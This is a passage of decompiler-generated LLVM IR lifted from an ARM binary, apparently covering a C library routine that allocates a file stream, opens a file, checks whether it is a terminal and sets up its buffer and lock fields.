  %v2_f39c = inttoptr i32 %v1_f39c to i8*
  %v3_f39c = load i8, i8* %v2_f39c, align 1
  %v4_f39c = zext i8 %v3_f39c to i32
  store i32 %v4_f39c, i32* @r3, align 4
  %v2_f3a0 = icmp ugt i8 %v3_f39c, 42
  store i1 %v2_f3a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3a0 = icmp eq i8 %v3_f39c, 43
  br i1 %v7_f3a0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_f38c
  store i32 %v1_f3a4, i32* @r3, align 4
  %v2_f3a8 = add nuw nsw i32 %v1_f3a4, 1
  store i32 %v2_f3a8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_f38c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3ac = icmp eq i32 %v0_f330, 0
  br i1 %v2_f3ac, label %dec_label_pc_f3b4, label %dec_label_pc_f3f0

dec_label_pc_f3b4:                                ; preds = %.thread3
  store i32 68, i32* %r0.global-to-local, align 4
  %v1_f3b8 = call i32 @malloc(i32 68)
  store i32 %v1_f3b8, i32* %r0.global-to-local, align 4
  store i32 %v1_f3b8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_f3bc = icmp eq i32 %v1_f3b8, 0
  br i1 %v3_f3bc, label %dec_label_pc_f730, label %dec_label_pc_f3c4

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f3b4
  %v0_f3c8 = load i32, i32* @r8, align 4
  %v2_f3c8 = add i32 %v0_f3c8, -37264
  store i32 %v2_f3c8, i32* %r3.global-to-local, align 4
  %v1_f3cc = inttoptr i32 %v2_f3c8 to i32*
  %v2_f3cc = load i32, i32* %v1_f3cc, align 4
  store i32 %v2_f3cc, i32* %r0.global-to-local, align 4
  %v3_f3cc = add i32 %v0_f3c8, -37260
  %v4_f3cc = inttoptr i32 %v3_f3cc to i32*
  %v5_f3cc = load i32, i32* %v4_f3cc, align 4
  store i32 %v5_f3cc, i32* @r1, align 4
  %v6_f3cc = add i32 %v0_f3c8, -37256
  %v7_f3cc = inttoptr i32 %v6_f3cc to i32*
  %v8_f3cc = load i32, i32* %v7_f3cc, align 4
  store i32 %v8_f3cc, i32* %r2.global-to-local, align 4
  %v2_f3d8 = add i32 %v1_f3b8, 8
  %v3_f3d8 = inttoptr i32 %v2_f3d8 to i32*
  store i32 0, i32* %v3_f3d8, align 4
  store i32 8192, i32* @ip, align 4
  %v2_f3e0 = load i32, i32* @r5, align 4
  %v3_f3e0 = inttoptr i32 %v2_f3e0 to i16*
  store i16 8192, i16* %v3_f3e0, align 2
  %v2_f3e4 = load i32, i32* %r0.global-to-local, align 4
  %v0_f3e8 = load i32, i32* @r5, align 4
  %v1_f3e8 = add i32 %v0_f3e8, 56
  store i32 %v1_f3e8, i32* @r3, align 4
  %v1_f3ec = inttoptr i32 %v1_f3e8 to i32*
  store i32 %v2_f3e4, i32* %v1_f3ec, align 4
  %v3_f3ec = add i32 %v0_f3e8, 60
  %v4_f3ec = inttoptr i32 %v3_f3ec to i32*
  %v5_f3ec = load i32, i32* @r1, align 4
  store i32 %v5_f3ec, i32* %v4_f3ec, align 4
  %v6_f3ec = add i32 %v0_f3e8, 64
  %v7_f3ec = inttoptr i32 %v6_f3ec to i32*
  %v8_f3ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_f3ec, i32* %v7_f3ec, align 4
  %v0_f3f0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f3f0

dec_label_pc_f3f0:                                ; preds = %.thread3, %dec_label_pc_f3c4
  %v0_f448 = phi i32 [ %v0_f334, %.thread3 ], [ %v0_f3f0.pre, %dec_label_pc_f3c4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_f3f0 = icmp slt i32 %v0_f448, 0
  br i1 %v1_f3f0, label %dec_label_pc_f448, label %dec_label_pc_f3f8

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3f0
  %v0_f3fc = load i32, i32* @r4, align 4
  %v2_f3fc = and i32 %v0_f3fc, 131075
  %v1_f400 = add nuw nsw i32 %v2_f3fc, 1
  store i32 %v1_f400, i32* %r2.global-to-local, align 4
  %v0_f404 = load i32, i32* @r7, align 4
  %v1_f404 = add i32 %v0_f404, 1
  %v2_f408 = and i32 %v1_f404, %v1_f400
  store i32 %v2_f408, i32* %r3.global-to-local, align 4
  %v3_f40c = icmp uge i32 %v2_f408, %v1_f400
  store i1 %v3_f40c, i1* %cpsr_c.global-to-local, align 1
  %v9_f40c = icmp eq i32 %v2_f408, %v1_f400
  %v1_f410 = load i32, i32* @r5, align 4
  %v2_f410 = add i32 %v1_f410, 4
  %v3_f410 = inttoptr i32 %v2_f410 to i32*
  store i32 %v0_f448, i32* %v3_f410, align 4
  br i1 %v9_f40c, label %dec_label_pc_f418, label %dec_label_pc_f354

dec_label_pc_f418:                                ; preds = %dec_label_pc_f3f8
  %v0_f418 = load i32, i32* @r4, align 4
  %v1_f418 = load i32, i32* @r7, align 4
  %v2_f418 = sub i32 -1, %v1_f418
  %v3_f418 = and i32 %v0_f418, %v2_f418
  store i32 %v3_f418, i32* @r3, align 4
  %v1_f41c = and i32 %v3_f418, 1024
  %v2_f41c = icmp eq i32 %v1_f41c, 0
  br i1 %v2_f41c, label %dec_label_pc_f43c, label %dec_label_pc_f424

dec_label_pc_f424:                                ; preds = %dec_label_pc_f418
  %v0_f424 = load i32, i32* @r6, align 4
  store i32 %v0_f424, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_f430 = call i32 @__libc_fcntl(i32 %v0_f424, i32 4)
  store i32 %v2_f430, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f434 = icmp eq i32 %v2_f430, 0
  br i1 %v2_f434, label %dec_label_pc_f424.dec_label_pc_f43c_crit_edge, label %dec_label_pc_f354

dec_label_pc_f424.dec_label_pc_f43c_crit_edge:    ; preds = %dec_label_pc_f424
  %v0_f43c.pre = load i32, i32* @r7, align 4
  %v0_f440.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %dec_label_pc_f424.dec_label_pc_f43c_crit_edge, %dec_label_pc_f418
  %v0_f440 = phi i32 [ %v0_f440.pre, %dec_label_pc_f424.dec_label_pc_f43c_crit_edge ], [ %v0_f418, %dec_label_pc_f418 ]
  %v0_f43c = phi i32 [ %v0_f43c.pre, %dec_label_pc_f424.dec_label_pc_f43c_crit_edge ], [ %v1_f418, %dec_label_pc_f418 ]
  %v1_f43c = and i32 %v0_f43c, 131072
  store i32 %v1_f43c, i32* %r3.global-to-local, align 4
  %v2_f440 = or i32 %v1_f43c, %v0_f440
  store i32 %v2_f440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f46c

dec_label_pc_f448:                                ; preds = %dec_label_pc_f3f0
  %v2_f448 = icmp eq i32 %v0_f448, -1
  store i1 %v2_f448, i1* %cpsr_c.global-to-local, align 1
  %v7_f448 = icmp eq i32 %v0_f448, -1
  %v0_f454.pre = load i32, i32* @r4, align 4
  br i1 %v7_f448, label %dec_label_pc_f448._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_f448
  %v2_f44c = or i32 %v0_f454.pre, 131072
  store i32 %v2_f44c, i32* @r4, align 4
  br label %dec_label_pc_f448._crit_edge

dec_label_pc_f448._crit_edge:                     ; preds = %dec_label_pc_f448, %bb53
  %v0_f454 = phi i32 [ %v2_f44c, %bb53 ], [ %v0_f454.pre, %dec_label_pc_f448 ]
  %v0_f450 = load i32, i32* @r7, align 4
  store i32 %v0_f450, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_f45c = call i32 @__libc_open(i32 %v0_f450, i32 %v0_f454)
  store i32 %v2_f45c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_f460 = icmp slt i32 %v2_f45c, 0
  %v1_f464 = load i32, i32* @r5, align 4
  %v2_f464 = add i32 %v1_f464, 4
  %v3_f464 = inttoptr i32 %v2_f464 to i32*
  store i32 %v2_f45c, i32* %v3_f464, align 4
  br i1 %v1_f460, label %dec_label_pc_f370, label %.dec_label_pc_f46c_crit_edge

.dec_label_pc_f46c_crit_edge:                     ; preds = %dec_label_pc_f448._crit_edge
  %v0_f470.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f46c

dec_label_pc_f46c:                                ; preds = %.dec_label_pc_f46c_crit_edge, %dec_label_pc_f43c
  %v0_f488 = phi i32 [ %v0_f470.pre, %.dec_label_pc_f46c_crit_edge ], [ %v2_f440, %dec_label_pc_f43c ]
  %v0_f46c = load i32, i32* @r5, align 4
  %v1_f46c = inttoptr i32 %v0_f46c to i16*
  %v2_f46c = load i16, i16* %v1_f46c, align 2
  %v3_f46c = zext i16 %v2_f46c to i32
  %v1_f470 = urem i32 %v0_f488, 4
  %v1_f474 = and i32 %v0_f488, 1024
  %v1_f478 = and i32 %v3_f46c, 8192
  %v1_f47c = add nuw nsw i32 %v1_f470, 1
  %v2_f480 = or i32 %v1_f478, %v1_f474
  store i32 %v2_f480, i32* %r3.global-to-local, align 4
  %v1_f484 = xor i32 %v1_f47c, 3
  %v1_f488 = and i32 %v0_f488, 131072
  store i32 %v1_f488, i32* %r2.global-to-local, align 4
  %v2_f488 = icmp eq i32 %v1_f488, 0
  %v1_f48c = add i32 %v0_f46c, 4
  %v2_f48c = inttoptr i32 %v1_f48c to i32*
  %v3_f48c = load i32, i32* %v2_f48c, align 4
  store i32 %v3_f48c, i32* @r4, align 4
  br i1 %v2_f488, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_f46c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_f46c, %bb54
  %v0_f498 = phi i32 [ 0, %dec_label_pc_f46c ], [ 32768, %bb54 ]
  %v4_f494 = mul nuw nsw i32 %v1_f484, 16
  %v5_f494 = or i32 %v2_f480, %v4_f494
  store i32 %v5_f494, i32* %r3.global-to-local, align 4
  %v2_f498 = or i32 %v0_f498, %v5_f494
  store i32 %v2_f498, i32* %r2.global-to-local, align 4
  %v2_f49c = icmp ugt i32 %v3_f48c, 2147483646
  store i1 %v2_f49c, i1* %cpsr_c.global-to-local, align 1
  %v8_f49c = icmp eq i32 %v3_f48c, 2147483647
  %v1_f4a0 = trunc i32 %v2_f498 to i16
  store i16 %v1_f4a0, i16* %v1_f46c, align 2
  br i1 %v8_f49c, label %dec_label_pc_f4e0, label %dec_label_pc_f4a8

dec_label_pc_f4a8:                                ; preds = %bb55
  store i32 ptrtoint (i32* @global_var_12e38.348 to i32), i32* %r3.global-to-local, align 4
  %v0_f4ac = call i32 @__aeabi_read_tp()
  %v3_f4b0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_f4b0 = sext i16 %v3_f4b0 to i32
  store i32 %v4_f4b0, i32* @r3, align 4
  store i32 %v0_f4ac, i32* @r6, align 4
  %v0_f4b8 = load i32, i32* @r4, align 4
  store i32 %v0_f4b8, i32* @r0, align 4
  %v2_f4bc = add i32 %v4_f4b0, %v0_f4ac
  %v3_f4bc = inttoptr i32 %v2_f4bc to i32*
  %v4_f4bc = load i32, i32* %v3_f4bc, align 4
  store i32 %v4_f4bc, i32* @r4, align 4
  %v1_f4c0 = call i32 @isatty(i32 %v0_f4b8)
  store i32 %v1_f4c0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4c4 = icmp eq i32 %v1_f4c0, 0
  br i1 %v2_f4c4, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_f4a8
  %v1_f4c8 = load i32, i32* @r5, align 4
  %v2_f4c8 = inttoptr i32 %v1_f4c8 to i16*
  %v3_f4c8 = load i16, i16* %v2_f4c8, align 2
  %v4_f4c8 = zext i16 %v3_f4c8 to i32
  %v2_f4cc = or i32 %v4_f4c8, 256
  store i32 %v2_f4cc, i32* %r3.global-to-local, align 4
  %v2_f4d0 = trunc i32 %v2_f4cc to i16
  store i16 %v2_f4d0, i16* %v2_f4c8, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_f4a8, %bb56
  %v3_f4d8 = load i16, i16* @global_var_222f0.75, align 2
  %v4_f4d8 = sext i16 %v3_f4d8 to i32
  store i32 %v4_f4d8, i32* %r3.global-to-local, align 4
  %v0_f4dc = load i32, i32* @r4, align 4
  %v1_f4dc = load i32, i32* @r6, align 4
  %v3_f4dc = add i32 %v1_f4dc, %v4_f4d8
  %v4_f4dc = inttoptr i32 %v3_f4dc to i32*
  store i32 %v0_f4dc, i32* %v4_f4dc, align 4
  br label %dec_label_pc_f4e0

dec_label_pc_f4e0:                                ; preds = %bb55, %.thread5
  %v0_f4e0 = load i32, i32* @r5, align 4
  %v1_f4e0 = add i32 %v0_f4e0, 8
  %v2_f4e0 = inttoptr i32 %v1_f4e0 to i32*
  %v3_f4e0 = load i32, i32* %v2_f4e0, align 4
  store i32 %v3_f4e0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4e4 = icmp eq i32 %v3_f4e0, 0
  br i1 %v2_f4e4, label %dec_label_pc_f4ec, label %bb57

dec_label_pc_f4ec:                                ; preds = %dec_label_pc_f4e0
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_f4f0 = call i32 @malloc(i32 4096)
  store i32 %v1_f4f0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4f4 = icmp eq i32 %v1_f4f0, 0
  %v1_f504.pre = load i32, i32* @r5, align 4
  br i1 %v2_f4f4, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_f4ec
  %v2_f4f8 = inttoptr i32 %v1_f504.pre to i16*
  %v3_f4f8 = load i16, i16* %v2_f4f8, align 2
  %v4_f4f8 = zext i16 %v3_f4f8 to i32
  %v2_f4fc = add i32 %v1_f4f0, 4096
  store i32 %v2_f4fc, i32* %r2.global-to-local, align 4
  %v2_f500 = or i32 %v4_f4f8, 16384
  store i32 %v2_f500, i32* %r3.global-to-local, align 4
  %v2_f504 = add i32 %v1_f504.pre, 8
  %v3_f504 = inttoptr i32 %v2_f504 to i32*
  store i32 %v1_f4f0, i32* %v3_f504, align 4
  %v1_f508 = load i32, i32* %r2.global-to-local, align 4
  %v2_f508 = load i32, i32* @r5, align 4
  %v3_f508 = add i32 %v2_f508, 12
  %v4_f508 = inttoptr i32 %v3_f508 to i32*
  store i32 %v1_f508, i32* %v4_f508, align 4
  %v1_f50c = load i32, i32* %r3.global-to-local, align 4
  %v2_f50c = trunc i32 %v1_f50c to i16
  %v3_f50c = load i32, i32* @r5, align 4
  %v4_f50c = inttoptr i32 %v3_f50c to i16*
  store i16 %v2_f50c, i16* %v4_f50c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_f4ec
  %v2_f50437 = add i32 %v1_f504.pre, 8
  %v3_f50438 = inttoptr i32 %v2_f50437 to i32*
  store i32 0, i32* %v3_f50438, align 4
  %v2_f510 = load i32, i32* @r5, align 4
  %v3_f510 = add i32 %v2_f510, 12
  %v4_f510 = inttoptr i32 %v3_f510 to i32*
  store i32 0, i32* %v4_f510, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_f4e0, %.thread9
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_f51c = load i32, i32* @r8, align 4
  %v2_f51c = add i32 %v0_f51c, 100
  %v3_f51c = inttoptr i32 %v2_f51c to i32*
  %v4_f51c = load i32, i32* %v3_f51c, align 4
  store i32 %v4_f51c, i32* %r3.global-to-local, align 4
  %v2_f520 = load i32, i32* @r5, align 4
  %v3_f520 = add i32 %v2_f520, 2
  %v4_f520 = inttoptr i32 %v3_f520 to i8*
  store i8 0, i8* %v4_f520, align 1
  %v0_f524 = load i32, i32* @r5, align 4
  %v1_f524 = inttoptr i32 %v0_f524 to i16*
  %v2_f524 = load i16, i16* %v1_f524, align 2
  %v3_f524 = zext i16 %v2_f524 to i32
  store i32 %v3_f524, i32* @r2, align 4
  %v0_f528 = load i32, i32* %r3.global-to-local, align 4
  %v1_f528 = inttoptr i32 %v0_f528 to i32*
  %v2_f528 = load i32, i32* %v1_f528, align 4
  store i32 %v2_f528, i32* @r1, align 4
  %v1_f52c = add i32 %v0_f524, 8
  %v2_f52c = inttoptr i32 %v1_f52c to i32*
  %v3_f52c = load i32, i32* %v2_f52c, align 4
  store i32 %v3_f52c, i32* %r3.global-to-local, align 4
  %v1_f530 = and i32 %v3_f524, 8192
  %v2_f530 = icmp eq i32 %v1_f530, 0
  %v2_f534 = add i32 %v0_f524, 20
  %v3_f534 = inttoptr i32 %v2_f534 to i32*
  store i32 %v3_f52c, i32* %v3_f534, align 4
  %v0_f538 = load i32, i32* @r1, align 4
  %v1_f538 = load i32, i32* @r5, align 4
  %v2_f538 = add i32 %v1_f538, 52
  %v3_f538 = inttoptr i32 %v2_f538 to i32*
  store i32 %v0_f538, i32* %v3_f538, align 4
  %v0_f53c = load i32, i32* %r3.global-to-local, align 4
  %v1_f53c = load i32, i32* @r5, align 4
  %v2_f53c = add i32 %v1_f53c, 24
  %v3_f53c = inttoptr i32 %v2_f53c to i32*
  store i32 %v0_f53c, i32* %v3_f53c, align 4
  %v0_f540 = load i32, i32* %r3.global-to-local, align 4
  %v1_f540 = load i32, i32* @r5, align 4
  %v2_f540 = add i32 %v1_f540, 28
  %v3_f540 = inttoptr i32 %v2_f540 to i32*
  store i32 %v0_f540, i32* %v3_f540, align 4
  %v0_f544 = load i32, i32* %r3.global-to-local, align 4
  %v1_f544 = load i32, i32* @r5, align 4
  %v2_f544 = add i32 %v1_f544, 16
  %v3_f544 = inttoptr i32 %v2_f544 to i32*
  store i32 %v0_f544, i32* %v3_f544, align 4
  %v0_f548 = load i32, i32* %r4.global-to-local, align 4
  %v1_f548 = load i32, i32* @r5, align 4
  %v2_f548 = add i32 %v1_f548, 44
  %v3_f548 = inttoptr i32 %v2_f548 to i32*
  store i32 %v0_f548, i32* %v3_f548, align 4
  br i1 %v2_f530, label %dec_label_pc_f730, label %dec_label_pc_f550

dec_label_pc_f550:                                ; preds = %bb57
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_f554 = load i32, i32* @r8, align 4
  %v2_f554 = add i32 %v0_f554, 168
  %v3_f554 = inttoptr i32 %v2_f554 to i32*
  %v4_f554 = load i32, i32* %v3_f554, align 4
  store i32 %v4_f554, i32* %r7.global-to-local, align 4
  %v0_f558 = call i32 @__aeabi_read_tp()
  store i32 %v0_f558, i32* %r0.global-to-local, align 4
  %v1_f55c = add i32 %v4_f554, 8
  %v2_f55c = inttoptr i32 %v1_f55c to i32*
  %v3_f55c = load i32, i32* %v2_f55c, align 4
  store i32 %v3_f55c, i32* %r3.global-to-local, align 4
  %v1_f560 = add i32 %v0_f558, -1168
  store i32 %v1_f560, i32* %r6.global-to-local, align 4
  %v3_f564 = icmp uge i32 %v3_f55c, %v1_f560
  store i1 %v3_f564, i1* %cpsr_c.global-to-local, align 1
  %v9_f564 = icmp eq i32 %v3_f55c, %v1_f560
  br i1 %v9_f564, label %dec_label_pc_f5a8, label %dec_label_pc_f56c

dec_label_pc_f56c:                                ; preds = %dec_label_pc_f550
  store i32 %v4_f554, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f574

dec_label_pc_f574:                                ; preds = %dec_label_pc_f580.dec_label_pc_f574_crit_edge, %dec_label_pc_f56c
  %v0_f574 = phi i32 [ %v0_f574.pre, %dec_label_pc_f580.dec_label_pc_f574_crit_edge ], [ %v4_f554, %dec_label_pc_f56c ]
  %v1_f574 = inttoptr i32 %v0_f574 to i32*
  %v2_f574 = load i32, i32* %v1_f574, align 4
  store i32 %v2_f574, i32* %r3.global-to-local, align 4
  %v1_f578 = load i32, i32* %r4.global-to-local, align 4
  %v3_f578 = icmp uge i32 %v2_f574, %v1_f578
  store i1 %v3_f578, i1* %cpsr_c.global-to-local, align 1
  %v9_f578 = icmp eq i32 %v2_f574, %v1_f578
  br i1 %v9_f578, label %dec_label_pc_f580, label %dec_label_pc_f598

dec_label_pc_f580:                                ; preds = %dec_label_pc_f574
  store i32 %v2_f574, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f590 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f590, label %dec_label_pc_f594, label %dec_label_pc_f580.dec_label_pc_f574_crit_edge

dec_label_pc_f580.dec_label_pc_f574_crit_edge:    ; preds = %dec_label_pc_f580
  %v0_f574.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f574

dec_label_pc_f594:                                ; preds = %dec_label_pc_f580
  %v0_f594 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f594, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f598

dec_label_pc_f598:                                ; preds = %dec_label_pc_f574, %dec_label_pc_f594
  %v0_f598 = phi i32 [ %v0_f594, %dec_label_pc_f594 ], [ %v2_f574, %dec_label_pc_f574 ]
  %v1_f598 = phi i32 [ %v0_f594, %dec_label_pc_f594 ], [ %v1_f578, %dec_label_pc_f574 ]
  %v3_f598 = icmp uge i32 %v0_f598, %v1_f598
  store i1 %v3_f598, i1* %cpsr_c.global-to-local, align 1
  %v9_f598 = icmp eq i32 %v0_f598, %v1_f598
  br i1 %v9_f598, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_f598
  %v1_f59c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_f59c, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_f598, %bb58
  %v1_f5a0 = xor i1 %v9_f598, true
  call void @__pseudo_cond_branch(i1 %v1_f5a0, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_f5a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f5a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_f5a4 = add i32 %v1_f5a4, 8
  %v3_f5a4 = inttoptr i32 %v2_f5a4 to i32*
  store i32 %v0_f5a4, i32* %v3_f5a4, align 4
  %v1_f5c4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f5a8

dec_label_pc_f5a8:                                ; preds = %dec_label_pc_f550, %bb59
  %v1_f5c4 = phi i32 [ %v3_f55c, %dec_label_pc_f550 ], [ %v1_f5c4.pre, %bb59 ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_f5ac = load i32, i32* @r8, align 4
  %v2_f5ac = add i32 %v0_f5ac, 168
  %v3_f5ac = inttoptr i32 %v2_f5ac to i32*
  %v4_f5ac = load i32, i32* %v3_f5ac, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_f5b4 = add i32 %v0_f5ac, 160
  %v3_f5b4 = inttoptr i32 %v2_f5b4 to i32*
  %v4_f5b4 = load i32, i32* %v3_f5b4, align 4
  store i32 %v4_f5b4, i32* %r7.global-to-local, align 4
  %v1_f5b8 = add i32 %v4_f5ac, 4
  %v2_f5b8 = inttoptr i32 %v1_f5b8 to i32*
  %v3_f5b8 = load i32, i32* %v2_f5b8, align 4
  store i32 %v3_f5b8, i32* %r3.global-to-local, align 4
  %v1_f5bc = add i32 %v4_f5b4, 8
  %v2_f5bc = inttoptr i32 %v1_f5bc to i32*
  %v3_f5bc = load i32, i32* %v2_f5bc, align 4
  store i32 %v3_f5bc, i32* %r2.global-to-local, align 4
  %v1_f5c0 = add i32 %v3_f5b8, 1
  store i32 %v1_f5c0, i32* %r3.global-to-local, align 4
  %v3_f5c4 = icmp uge i32 %v3_f5bc, %v1_f5c4
  store i1 %v3_f5c4, i1* %cpsr_c.global-to-local, align 1
  %v9_f5c4 = icmp eq i32 %v3_f5bc, %v1_f5c4
  store i32 %v1_f5c0, i32* %v2_f5b8, align 4
  br i1 %v9_f5c4, label %dec_label_pc_f610, label %dec_label_pc_f5d0

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_f5a8
  %v0_f5d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_f5d4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_f5dc95 = inttoptr i32 %v0_f5d4 to i32*
  %v2_f5dc96 = load i32, i32* %v1_f5dc95, align 4
  store i32 %v2_f5dc96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_f5e098 = icmp eq i32 %v2_f5dc96, 0
  br i1 %v9_f5e098, label %dec_label_pc_f5e8, label %dec_label_pc_f600

dec_label_pc_f5e8:                                ; preds = %dec_label_pc_f5d0, %dec_label_pc_f5e8.dec_label_pc_f5dc_crit_edge
  %v0_f5e899 = phi i32 [ %v1_f5e0.pre, %dec_label_pc_f5e8.dec_label_pc_f5dc_crit_edge ], [ 0, %dec_label_pc_f5d0 ]
  store i32 %v0_f5e899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f5f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f5f8, label %dec_label_pc_f5fc, label %dec_label_pc_f5e8.dec_label_pc_f5dc_crit_edge

dec_label_pc_f5e8.dec_label_pc_f5dc_crit_edge:    ; preds = %dec_label_pc_f5e8
  %v0_f5dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f5e0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_f5dc = inttoptr i32 %v0_f5dc.pre to i32*
  %v2_f5dc = load i32, i32* %v1_f5dc, align 4
  store i32 %v2_f5dc, i32* %r3.global-to-local, align 4
  %v3_f5e0 = icmp uge i32 %v2_f5dc, %v1_f5e0.pre
  store i1 %v3_f5e0, i1* %cpsr_c.global-to-local, align 1
  %v9_f5e0 = icmp eq i32 %v2_f5dc, %v1_f5e0.pre
  br i1 %v9_f5e0, label %dec_label_pc_f5e8, label %dec_label_pc_f600

dec_label_pc_f5fc:                                ; preds = %dec_label_pc_f5e8
  %v0_f5fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f5fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %dec_label_pc_f5d0, %dec_label_pc_f5e8.dec_label_pc_f5dc_crit_edge, %dec_label_pc_f5fc
  %v0_f600 = phi i32 [ %v0_f5fc, %dec_label_pc_f5fc ], [ %v2_f5dc96, %dec_label_pc_f5d0 ], [ %v2_f5dc, %dec_label_pc_f5e8.dec_label_pc_f5dc_crit_edge ]
  %v1_f600 = phi i32 [ %v0_f5fc, %dec_label_pc_f5fc ], [ 0, %dec_label_pc_f5d0 ], [ %v1_f5e0.pre, %dec_label_pc_f5e8.dec_label_pc_f5dc_crit_edge ]
  %v3_f600 = icmp uge i32 %v0_f600, %v1_f600
  store i1 %v3_f600, i1* %cpsr_c.global-to-local, align 1
  %v9_f600 = icmp eq i32 %v0_f600, %v1_f600
  br i1 %v9_f600, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_f600
  %v1_f604 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_f604, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_f600, %bb60
  %v1_f608 = xor i1 %v9_f600, true
  call void @__pseudo_cond_branch(i1 %v1_f608, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_f60c = load i32, i32* %r6.global-to-local, align 4
  %v1_f60c = load i32, i32* %r7.global-to-local, align 4
  %v2_f60c = add i32 %v1_f60c, 8
  %v3_f60c = inttoptr i32 %v2_f60c to i32*
  store i32 %v0_f60c, i32* %v3_f60c, align 4
  br label %dec_label_pc_f610

dec_label_pc_f610:                                ; preds = %dec_label_pc_f5a8, %bb61
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_f614 = load i32, i32* @r8, align 4
  %v2_f614 = add i32 %v0_f614, 160
  %v3_f614 = inttoptr i32 %v2_f614 to i32*
  %v4_f614 = load i32, i32* %v3_f614, align 4
  store i32 %v4_f614, i32* %r0.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_f61c = add i32 %v0_f614, 84
  %v3_f61c = inttoptr i32 %v2_f61c to i32*
  %v4_f61c = load i32, i32* %v3_f61c, align 4
  store i32 %v4_f61c, i32* @r1, align 4
  %v1_f620 = add i32 %v4_f614, 4
  %v2_f620 = inttoptr i32 %v1_f620 to i32*
  %v3_f620 = load i32, i32* %v2_f620, align 4
  store i32 %v3_f620, i32* %r3.global-to-local, align 4
  %v1_f624 = inttoptr i32 %v4_f61c to i32*
  %v2_f624 = load i32, i32* %v1_f624, align 4
  store i32 %v2_f624, i32* @r2, align 4
  %v1_f628 = add i32 %v3_f620, 1
  store i32 %v1_f628, i32* %r3.global-to-local, align 4
  store i32 %v1_f628, i32* %v2_f620, align 4
  %v0_f630 = load i32, i32* @r2, align 4
  %v1_f630 = load i32, i32* @r5, align 4
  %v2_f630 = add i32 %v1_f630, 32
  %v3_f630 = inttoptr i32 %v2_f630 to i32*
  store i32 %v0_f630, i32* %v3_f630, align 4
  %v0_f634 = load i32, i32* %r0.global-to-local, align 4
  %v1_f634 = add i32 %v0_f634, 4
  %v2_f634 = inttoptr i32 %v1_f634 to i32*
  %v3_f634 = load i32, i32* %v2_f634, align 4
  %v1_f638 = add i32 %v3_f634, -1
  store i32 %v1_f638, i32* %r3.global-to-local, align 4
